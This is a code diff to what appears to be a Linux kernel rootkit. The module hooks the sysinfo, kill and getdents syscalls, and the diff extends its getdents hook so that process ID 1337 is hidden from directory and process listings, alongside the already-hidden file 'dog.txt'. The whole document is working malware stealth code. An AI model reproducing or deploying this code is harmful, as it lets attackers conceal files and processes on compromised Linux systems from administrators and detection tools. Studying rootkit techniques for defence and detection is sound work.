@@ -30,6 +30,7 @@
 // this is the filename we want to hide
 // used in hacked_getdents(...)
 #define TO_HIDE "dog.txt"
+char hidePID[] = "1337";
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
@@ -127,7 +128,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
         // if we see the filename which we want to hide,
         // then modify the number of bytes read
         // & move on
-        if (strncmp(cur->d_name, TO_HIDE, strlen(TO_HIDE)) == 0) {
+        if (strncmp(cur->d_name, TO_HIDE, strlen(TO_HIDE)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
             // length of the linux_dirent
             int reclen = cur->d_reclen;
             // calc. the next file/directory location
